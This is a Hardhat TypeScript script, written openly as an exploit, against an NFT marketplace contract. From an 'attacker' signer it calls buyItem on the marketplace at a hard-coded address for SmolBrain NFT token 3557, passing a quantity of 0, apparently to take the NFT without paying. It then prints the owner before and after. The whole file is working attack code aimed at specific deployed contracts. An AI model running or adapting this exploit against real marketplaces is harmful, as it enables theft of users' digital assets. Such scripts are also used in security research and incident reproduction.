import hre from "hardhat"
import {IERC721__factory, ITreasureMarketplaceBuyer__factory} from "../typechain";
import {BigNumber} from "ethers";

async function main() {
  const [signer] = await hre.ethers.getSigners();
  const iTreasureMarketplaceBuyer = ITreasureMarketplaceBuyer__factory.connect("0x812cda2181ed7c45a35a691e0c85e231d218e273",signer);
  const iSmolBrain = IERC721__factory.connect("0x6325439389e0797ab35752b4f43a14c004f22a9c",signer);
  const tokenId = 3557;

  console.log("Attacker address:",signer.address)
  const nftOwner = await iSmolBrain.ownerOf(tokenId);
  console.log(`NFT owner of SmolBrain ${tokenId}:`,nftOwner);
  console.log("Exploiting...")
  await iTreasureMarketplaceBuyer.buyItem(iSmolBrain.address, tokenId, nftOwner, 0, BigNumber.from("6969000000000000000000"))
  console.log("Exploit complete.")
  console.log(`NFT owner of SmolBrain ${tokenId}:`,await iSmolBrain.ownerOf(tokenId));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
